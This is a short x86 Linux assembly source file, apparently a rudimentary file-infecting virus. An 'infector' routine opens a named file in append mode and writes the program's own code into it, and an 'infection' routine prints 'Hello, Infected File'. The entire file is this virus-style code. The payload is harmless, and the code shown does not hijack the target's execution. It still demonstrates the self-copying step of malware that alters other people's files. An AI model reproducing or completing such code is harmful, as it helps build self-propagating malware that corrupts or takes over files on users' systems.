section .text
    global infection
    global infector
    global code_start
    global code_end


msg:    
    db "Hello, Infected File", 10
msg_end:

msg_len equ msg_end - msg

section .text
code_start:


infection:
    mov     eax, 4            ; sys_write
    mov     ebx, 1            ; fd = stdout
    mov     ecx, msg          ; buffer
    mov     edx, msg_len      ; length
    int     0x80
    ret

infector:
    push    ebp
    mov     ebp, esp

    mov     eax, 5            ; sys_open
    mov     ebx, [ebp + 8]    ; filename pointer
    mov     ecx, 0x401        ; flags = O_WRONLY(1) | O_APPEND(0x400) = 0x401
    mov     edx, 0            ; mode (not used for append)
    int     0x80
    ; return in eax (fd) or negative on error
    cmp     eax, 0
    jl      .inf_done         ; if error, just return

    ; save fd
    mov     ebx, eax          ; ebx = fd

    ; write(fd, code_start, code_size)
    mov     eax, 4            ; sys_write
    ; ebx already = fd
    mov     ecx, code_start   ; address of data to write
    mov     edx, code_end - code_start  ; size (assembled-time constant)
    int     0x80

    ; close(fd)
    mov     eax, 6            ; sys_close
    ; ebx already = fd
    int     0x80
.inf_done:
    mov     esp, ebp
    pop     ebp
    ret

code_end: